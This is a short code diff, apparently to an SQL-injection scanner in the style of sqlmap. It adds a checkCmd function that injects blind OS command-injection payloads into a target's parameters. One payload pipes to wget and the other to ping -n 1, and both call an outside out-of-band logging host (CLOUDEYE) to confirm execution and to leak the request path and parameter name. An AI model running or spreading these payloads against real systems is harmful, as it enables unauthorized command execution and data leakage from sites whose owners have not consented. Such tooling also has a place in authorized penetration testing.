@@ -11,6 +11,8 @@ import random
 import re
 import socket
 import time
+import base64
+import string
 
 from subprocess import Popen as execute
 
@@ -86,7 +88,17 @@ from lib.request.templates import getPageTemplate
 from lib.techniques.union.test import unionTest
 from lib.techniques.union.use import configUnion
 
-
+#add check cmd
+def checkCmd(place, parameter, value):
+    host = conf.hostname
+    cmd = "| wget " + conf.hostname + ".cmd" + CLOUDEYE + conf.path + '/?-->' + parameter
+    linuxpayload = agent.payload(place, parameter, newValue=cmd, where=1)
+    Request.queryPage(linuxpayload, place, raise404=False)
+    b64path = string.replace(base64.b64encode(conf.path), "=", "", 2)
+    wincmd =  "| ping -n 1 " + parameter +"."+ b64path+"."+conf.hostname + ".cmd" + CLOUDEYE
+    # -n 1 option detect linux
+    winpayload = agent.payload(place, parameter, newValue=wincmd, where=1)
+    Request.queryPage(winpayload, place, raise404=False)
 # add jax777 check ssrf 
 def checkSsrf(place, parameter, value):
     host = conf.hostname
